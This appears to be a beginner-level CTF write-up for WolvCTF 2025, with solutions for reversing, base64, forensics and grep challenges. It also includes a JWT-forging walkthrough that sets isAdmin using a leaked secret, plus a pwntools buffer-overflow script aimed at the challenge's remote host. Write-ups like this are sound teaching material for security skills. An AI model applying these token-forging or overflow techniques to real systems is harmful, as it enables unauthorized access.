# WolvCTF 2025 -- Beginner
CTFTime : https://ctftime.org/event/2579
Date : 22 March, 06:00 UTC+7 — 24 March 2025, 06:00 UTC+7

> [!NOTE]  
> I made this **Beginner** category writeups separated from others, check the others here > [Other Category](./README.md)

<details>
    <summary>Table of contents</summary>

1. [Reverse Engineering](#-rev)
    - [REverse](#reverse)
    - [REdata](#redata)
2. [Cryptography](#-crypto)
    - [OverAndOver](#overandover)
3. [Web Exploitation](#-web)
    - [JWT Learning](#jwt-learning)
4. [Forensics](#️-forensics)
    - [PicturePerfect](#pictureperfect)
    - [DigginDir](#diggindir)
5. [Pwn](#-pwn)
    - [p0wn3d](#p0wn3d)
</details>

# 🔀 Rev
## REverse
### Description
> I hate when when RE challenges just make me do something backwards...
**Attachment :** [dist.tar.gz](./files/dist-re.tar.gz)

### Solve
Ok, after extracted the archived file, i got 2 files (out.txt and reverse). The out.txt is the result of what the `reverse` file processed. Then, if i wanna reverse engineer this, i need a decompiler. You can use any decompiler, but i recommend use **Ghidra**.

[gambar ss]

There 2 interesting functions, `main()` and `mix_flag()`. The main() function is the entry point of the program. The `mix_flag()` function is the function that we need to reverse. The `mix_flag()` read a flag.txt that want to be mixed, then stored it in `local_e8`. After that, it shifted each character by -3 in ASCII. The last process is reverse the string order.

So, if i wanna reverse this process, i have to do it in reverse order. Use this script to solve it :
```python
def reverse_mix_flag(mixed_flag):
    # Langkah 1: Add 3 in ascii
    reversed_flag = ''.join([chr(ord(c) + 3) for c in mixed_flag])

    # Langkah 2: Revres swapping char
    reversed_flag = list(reversed(reversed_flag))
    reversed_flag = ''.join(reversed_flag)

    return reversed_flag

mixed_flag = "t`qcxo0s0o2.kd\.k\o0s0o20z"  # From out.txt
original_flag = reverse_mix_flag(mixed_flag)

print("Original Flag:", original_flag)

```

And the last thing to do is reverse it 

[gambar ss]

**Flag :**
```flag
wctf{r3v3r51ng_1n_r3v3r53}
```
## REdata
### Description
> An eZ RE challenge.

**Hint :**
> - did you know that there is information other than code in a binary?
> - Are there any utilities that let you find strings in files?
>
> **Attachment :** [redata](./files/redata)

### Solve
Actually, this challenge is quite easy. We can use `strings` command to find the strings in the binary file. After that, we can find the flag in the output. Just type **`strings redata | grep wctf`** and you will get the flag.

**Flag :**
```flag
wctf{n0_w4y_y0u_f0unD_1t!}
```

# 🔏 Crypto
## OverAndOver
### Description
> You found a strange string that seems to be encoded with base64... yet still scrambled after decoding...
**Attachment :** [encoded.txt](./files/encoded.txt)

### Solve
Take a look at the attachment file, it is a base64 encoded string. We can decode it using [Cyberchef](https://gchq.github.io/CyberChef/). But, it still encoded. So, i think this is encoded over and over using **Base64**. Just add more base64 in CyberChef recipe section. And i got the flag after decode it 16 times.

[gambar ss]

**Flag :**
```flag
wctf{bA5E_tWo_p0W_s!X}
```

# 🌐 Web
## JWT Learning
### Description
> JWTs (JSON Web Tokens) are created at login and used by backends to efficiently verify certain things (claims) about the authenticated user.
>
> Usually these cannot be tampered with because they are cryptographically signed.
>
> Let's learn a little about JWTs and tamper with one in a badly-written web app.
>
> This challenge will walk you through each step.
> 
> https://beginner-jwt-learning-974780027560.us-east5.run.app

### Solve
Ok, this is a web challenge that teach us about what JWT token is and how it can be cracked to bypass admin's privilege.
First, we need to login to the website and get the JWT token. Then, we can use the given JWT token. Actually, if you pay attention and read all of web's content, it will leads you to the flag. The brief steps is like this :
- Login with random username,
- Go to Inspect Element (F12),
- Go to "Application" tab on it,
- Check the "cookies" and copy its value,
- Decode it with JWT decoder (https://jwt.io/),
- Change the "isAdmin" to "true" and encode it back to JWT token,
- Don't forget to add TOKEN _secret_ from /Robots.txt > /TOKEN_SECRET.txt,

[gambar ss]

- Add it into jwt.io encoder,
- Copy the new token and paste it into the website's cookie, then refresh the page.

[gambar ss]


**Flag :**
```flag
wctf{jw7_l34rn1n6_15_fun_135624154}
```

# 🕵️ Forensics
## PicturePerfect
### Description
> Wow what a respectful, happy looking lad! Hmmmmmmm, all I see is a snowman... maybe some details from the image file itself will lead us to the flag.
**Attachment :** [hi_snowman.jpg](./files/hi_snowman.jpg)

### Solve
To solve this challenge, you must knpow about **metadata**. What is metadata? It's a set of data that stores file's information (Size, Author, Place, Date, etc). We can add, edit or remove any metadata value of our files. So, i used `exiftools` command line to see _metadata_ of this picture. Use `exiftool hi_snowman.jpg` and it will show these informations. There is the flag, so, just submit em.

[gambar ss]

**Flag :**
```flag
wctf{d0_yOU_w@nt_t0_BUiLd_a_Sn0Wm@n}
```
## DigginDir
### Description
> So I tripped on an uneven sidewalk today.... and I dropped the flag somewhere (oops). It's gotta be here somewhere..... right?
**Hint :** I wish there was a linux utility that let me search for stuff...
>
> **Attachment :** [dist.tar.gz](./files/dist-dir.tar.gz)

### Solve
Once i extracted the archived file, there are **so many** subfolder inside. So, because i just wanna search a 'flag', i use a command that can find a string or text in a directory, `grep`. It will leads us to a directory or file that contains the needed string. Then, add `-r` flag to search it _recursively_.
```sh
grep -r "wctf"
```

[gambar ss]

**Flag :**
```flag
wctf{0h_WOW_tH@Nk5_yOu_f0U^d_1t_xD}
```

# 💻 Pwn
## p0wn3d
### Description
> An introduction to pwn challenges. This is to protect the babies from last year!
>
> `nc p0wn3d.kctf-453514-codelab.kctf.cloud 1337`
**Hint :** What is a buffer overflow? What is acii?
**Attachment :** [dist.tar.gz](./files/dist-pwn.tar.gz)

### Solve
After extract the given attachment, i got 2 files, `main.c` and `chal` binary file. Then, after analyzed the **main.c** file, there is avulnerability in how the program handles user input. The program uses `fgets()` function to get user input, which is need 64 bytes. But, the char bug[] is only takes 32 bytes and int guard is 4 bytes. So, if we input more than 32 bytes, it will overflow the buffer and we can control it. 
```c
if (local_18 == 0x42424242) {
    get_flag();
}
```
If we wanna get the flag, we have to make `local_18` equal to `0x42424242`. So, we can use python as the solver script. Run it and i got the flag.
Here is the solver.py :
```python
from pwn import *

# Make the payload (32 bytes dummy + 0x42424242)
payload = b"A" * 32 + p32(0x42424242)

# p = process("./chal") # For try it locally
p = remote("p0wn3d.kctf-453514-codelab.kctf.cloud", 1337)
p.sendline(payload)

# Lihat output flag
p.interactive()
```
**Flag :**
```flag
wctf{pwn_1s_l0v3_pwn_1s_l1f3}
```